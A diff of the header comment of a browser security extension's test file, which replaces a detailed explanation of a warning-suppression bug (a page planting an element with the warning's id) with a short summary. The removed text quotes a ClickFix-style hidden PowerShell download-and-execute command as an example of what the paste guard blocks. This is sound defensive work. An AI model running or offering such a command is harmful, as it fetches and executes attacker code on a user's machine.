@@ -4,27 +4,8 @@
    Upstream filter-list attribution: CREDITS.md
    Redistributing a modified copy? GPLv3 section 5(a) requires you to mark it as changed,
    with the date, and to keep these notices intact. */
-/*
- * Can a page suppress a warning by planting an element with its id (M44)?
- *
- * Four high-stakes warnings decided whether they were already showing by asking the document:
- *
- *     if (document.getElementById('wo-cmd-warn')) return;
- *
- * content.min.js is world:MAIN, so the page answers that question. A page shipping
- * <div id="wo-cmd-warn" hidden></div> in its own markup silently suppressed the warning entirely,
- * and none of the four has a toast or badge fallback -- so nothing at all reached the user.
- *
- * The one that matters most is commandPasteGuard: a ClickFix / fake-CAPTCHA page talks the user
- * into pasting `powershell -w hidden -c iwr ...|iex` into the Run dialog, and the guard that is
- * meant to interrupt that is turned off by one line of the attacker's own HTML.
- *
- * Same defect as the full-page blockers (H15, tools/test-blocker-durability.js), so the same
- * answer: hold the node we built and ask it, not the document. __woWarn is a private registry the
- * page has no reference to, so a decoy carrying our id is simply not in it.
- *
- * Run: node tools/test-warning-ownership.js
- */
+/* Page-created lookalike IDs must not suppress warnings held in the private node registry. (M44, H15)
+   Run: node tools/test-warning-ownership.js */
 'use strict';
 
 const fs = require('fs');
